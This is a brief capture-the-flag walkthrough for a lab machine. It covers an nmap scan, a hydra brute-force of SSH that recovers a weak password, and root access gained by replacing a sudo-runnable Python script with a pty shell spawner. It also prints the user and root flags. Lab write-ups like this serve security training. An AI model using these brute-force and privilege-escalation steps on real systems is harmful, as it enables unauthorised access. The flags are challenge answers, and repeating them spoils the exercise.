
---
IP = `10.10.175.71`

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

#### Users

> http://10.10.175.71

```
meliodas
root
www-data
Anonymous
```

### Password BruteForcing

> hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.175.71

```
[22][ssh] host: 10.10.175.71   login: meliodas   password: iloveyou1
```

### Initial Foothold

> ssh meliodas@10.1.175.71


**user.txt**

`6d488cbb3f111d135722c33cb635f4ec`

### Privilage Escalation


> sudo -l

```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

```

so we can run bak.py but we cant edit it is owned by root

```
meliodas@ubuntu:~$ cat bak.py   
#!/usr/bin/env python  
import os  
import zipfile  
  
def zipdir(path, ziph):  
    for root, dirs, files in os.walk(path):  
        for file in files:  
            ziph.write(os.path.join(root, file))  
  
if __name__ == '__main__':  
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)  
    zipdir('/var/www/html', zipf)  
    zipf.close()

```

we are now going to delete this file and make new file with same name

```
meliodas@ubuntu:~$ rm -f bak.py  
meliodas@ubuntu:~$ cat > bak.py << EOF  
#!/usr/bin/env python  
import pty  
pty.spawn("/bin/bash")  
EOF
```

this command makes a new file bak.py.

```
meliodas@ubuntu:~$ cat bak.py   
#!/usr/bin/env python  
import pty  
pty.spawn("/bin/bash")
```

give permission

`meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py`

now we can read root flag

**root.txt**

`e8c8c6c256c35515d1d344ee0488c617`
